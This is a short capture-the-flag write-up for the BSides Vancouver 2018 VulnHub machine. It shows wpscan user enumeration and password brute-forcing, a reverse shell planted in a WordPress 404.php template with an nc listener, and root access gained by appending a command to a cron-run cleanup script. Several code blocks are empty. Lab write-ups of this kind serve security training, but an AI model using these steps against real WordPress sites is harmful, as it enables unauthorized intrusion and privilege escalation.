Beginner-level difficulty, from vulnhub but originally from BSides Vancouver 2018, (Not ​another ​wordpress) Again one of my older writeups, I don't really explain my steps.

### Scanning:

```

### Looking at users.txt.bk:

```

### HTTP:

#### Web Enumeration:

```

```

#### Checking robots.txt:

```
robots.​ txt:
User-​ agent:​ *
Disallow:​ /backup_wordpress
```

### Checking out /backup\_wordpress:

![](/assets/images/bs17/22-002.png)

### Enumerating Wordpress Users:

```
crazyeights@es-base:~$ wpscan --url http://192.168.56.112/backup_wordpress/
-e u
[i] User(s) Identified:
[+] john
| Found By: Author Posts - Display Name (Passive Detection)

```

### Cracking users passwords:

```
crazyeights@es-​ base​ :~$ wpscan --url http://192.168.56.112/backup_wordpress/
--passwords lists/rockyou-40.txt --usernames john,admin
[​ + ​ ] Performing password attack ​ on​ Xmlrpc against ​ 2 ​ user/s
[​ SUCCESS​ ] - ​ john / enigma
```

Log into wordpress with credentials john:enigma

Go to Appearance > Editor > 404.php, and replace the template with a reverse shell.

##### Putting a reverse shell in 404.php:

Run nc -lvp 1234, then paste the reverse shell and save:

![](/assets/images/bs17/22-004.png)

If the listener does not connect immediately when the template is saved fo to wp-content/themes/twentysixteen/404.php

![](/assets/images/bs17/22-006.png)

### Priv. Escalation:

This might work, I didn’t test it:

![](/assets/images/bs17/22-008.png)

```
$ lsb_release -a
No​ LSB modules are available.
Distributor ID:
Ubuntu
Description:
Ubuntu 12.04.4 LTS
Release:
12.04
Codename:
precise
```

(There is probably an exploit for this too)

### Checking out wp\_config.php:

(Sometimes there are credentials)

![](/assets/images/bs17/22-010.png)

### Checking out crontab:

(Path of least resistance)

```
$ cat crontab
[SNIP]
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
[SNIP]
#$ * * * * root /usr/local/bin/cleanup
```

### Checking out cleanup:

![](/assets/images/bs17/22-012.png)

Getting the root flag in an extremely lazy way: Modifying cleanup script:

```
$ echo cp /root/flag.txt /home/flag.txt >> cleanup
$ cat cleanup
#!/bin/sh
[SNIP]
cp /root/flag.txt /home/flag.txt
```

Checking the /home directory for the flag:

```
$ ls -lai /home
total 32
393219 drwxr-xr-x 7 root  root 4096 Sep 26 13:35 .
     2 drwxr-xr-x 23 root root 4096 Mar 3 2018 ..
420171 -rw-r--r-- 1 root  root 248 Sep 26 13:36 flag.txt
[SNIP]
```

### Getting the flag:

```
$ ​ cat​ /home/flag.txt
Congratulations!
If you can ​ read​ this, that means you were able ​ to​ obtain root permissions
on​ this VM.
You should ​ be​ proud!
There are multiple ways ​ to​ gain access remotely, ​ as​ well ​ as​ ​ for​ privilege
escalation.Did you ​ find​ them ​ all​ ?
